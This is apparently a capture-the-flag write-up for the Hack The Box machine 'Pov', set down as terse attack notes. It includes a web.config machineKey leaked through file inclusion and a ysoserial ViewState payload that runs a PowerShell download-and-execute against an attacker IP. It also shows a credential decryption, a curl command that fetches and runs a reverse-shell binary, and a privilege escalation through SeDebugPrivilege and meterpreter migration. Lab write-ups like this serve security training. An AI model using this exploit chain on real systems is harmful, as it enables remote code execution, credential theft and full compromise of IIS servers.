#SeDebugPrivilege #iis #viewstate
- Scan :
```sh
nmap -Pn -sC -sV -p- -T 5 10.10.11.251
```

- Output(Got nothing) :
```sh
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-IIS/10.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

- Directory and file enumeration (Got nothing): 
```sh
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://10.10.11.251/FUZZ -recursion -recursion-depth 1 -e .php,.config,.aspx,asp -v
```

- Subdomain enumeration(Got nothing) : 
```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u https://FUZZ.pov.htb/
```

- Vhost enumeration: 
```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://pov.htb/ -H 'Host: dev.pov.htb' -fs 1233
```

`Got "dev"`

- Re directory and files enumeration : 
```sh
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://pov.htb/FUZZ -recursion -recursion-depth 1 -e .php,.config,.aspx,asp -H 'Host: dev.pov.htb' -fw 9
```

- Interesting content : 
`Exploiting the download field to download file and download the file web.config with an LFI ..\web.config 

```sh
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```

- Gain RCE thanks to viewstate and the web.config : 
https://blog.liquidsec.net/2021/06/01/asp-net-cryptography-for-pentesters/

- Generate the Payload : 
```sh
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.18:8080/shell.ps1') "  --decryptionalg="AES"  --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/default.aspx"
```

- Payload : 
```sh
Tmr%2FEu26m6Npj1v3UANlXqgDCMVMPGilbDr%2BmFVUwpCYlpPna6906W9V46Yy589eKDvEdgZigdd11TRy%2FQCDrXH7y8z%2BrIj%2BRpNDfQ%2FF7hqamdDRYToO12kmUzL354tdqoBGwvs%2Fb%2BLbSW5H4VFBZUamtF88XUD55rA08noF0mMUEUDLymiO1BogrdzrVWiARSYfBTKRJYOwryaFZ5XyD1dgSbslqXfJEx%2BtTCDhDLVSLIbRN4%2BM%2FJoq5cyFClkp8ROn0SGoHFSk2cTWXVzqyM2tagZkpwjCUadmFPtDtNjFmBclIkuRNdglpZKVCgxS5rzAaqocVsAjCvEgn%2FFET1EsnM8UEuMZTkakN00b3RmksNg3V7qUex12F7OMLG%2FYp6Jm%2FEYzVAnEFQliVyvTKoK5nkB2q3gTPaBo1r3FbqXRe3SFrCWVxizkK2%2FaW3OMyN6oQGbW6lJNAmQWxNBb4cokTqV2KRoxqcEnynfMaRnJTki7Nyz2ukqFQwcYYHgQlVodMyAF0eAB9bxi%2FhbLOJWhlZlTpOxQj%2FOZn2qIkrWLCUMDoPjq60HZ4A3k68w9MhmMFAFPBGK5%2BMrtUqDhXY6XH1FK9a9jEQpmD1JFGnA2EMNwhlfUpLVTlCTh3XvCdmcXvDFHv2qiBy0UOH0oXjSxivkocYehsfNne85zxt3WYTsdVKrSwT%2FVSZ6Gf%2FOzI24UV6n7BBFRIIPzRTgkFdcTWeyR3qcJwHyhYJSOQF7KLXr43x7RGFPDPxTs1KTyfK3cuo0vWyg0BlSG74UcRuKjD49hLDsyqF4fRsXIKPoH%2F7HOi1oAmpmcnl%2B1h6J0Uecgm2d5ELlCkG5XvwPUyJtRLtyFSKJaa6W627%2B%2FbbDbSQcNvMFFk2IOmqVZmKpgVVME%2BUNxaKqng1FC7lKjbSafu2wxqKRWgq0aW9JCVJKAPeuL%2BFQDtVYpokFWAhtBKI6x5hl4E1i6g895gz8ipvB291KKKf03oeRKZeYqW8nKU1hKw%2F2uq9tpoMTjY5LR0VYuCWmyztD1DBrxW66T3d7cohCEDx%2F8NQb%2BbyWFtNNLj%2BlciLkeBsMwqY%2FnIutenJ2jMPjKjy%2FKB0fWLvRy1GktVWpK8TwMbs62O3UHOvNRCGI0tYgxOVqWdu%2FSNzcMIc7VXyFaPbeVA8azcQMajp%2BZWr7DFqcT41psy5daDe6BmeM2mCq4C%2F4TOAd87W%2BLJOypcHqFQ0iVT8eKgvK6sgLRZXvAu1hdRnmCgyphpSTxdOutK7di9Hox45uSzI4IoVxVQEOJ%2BwduD4s%2BFX5OkExzWyKwnE3YKqiIXS6U2CGfkgJUg8kpXpcV6ZqsX5t9AxZQR8ZZaRyxt6qE%2Fh6iH3LpGz%2BqwgBuGPJPJwzeedWhjhz03e%2FrUMko9UzawOU1ycQrsw%3D%3D
```

- Credential user :
```sh
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```

- Decrypt the password : 
```powershell
$credential = Import-CliXml -Path connection.xml
$credential.GetNetworkCredential().Password

"alaading":"f8gQ8fynP44ek1m3"
```

- Download second shell: 
```cmd
run.exe alaading f8gQ8fynP44ek1m3 "cmd /c curl -o c:/users/alaading/desktop/shell2.exe http://10.10.15.18:8080/reverse2.exe "
```

- Run as the new user : 
```sh
run.exe alaading f8gQ8fynP44ek1m3 "cmd /c c:\users\alaading\desktop\shell2.exe"
```

- Enable all privileges : 
```sh
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
```

- Migrate the process with the meterpreter : 
```sh
ps 
migrate 672
```
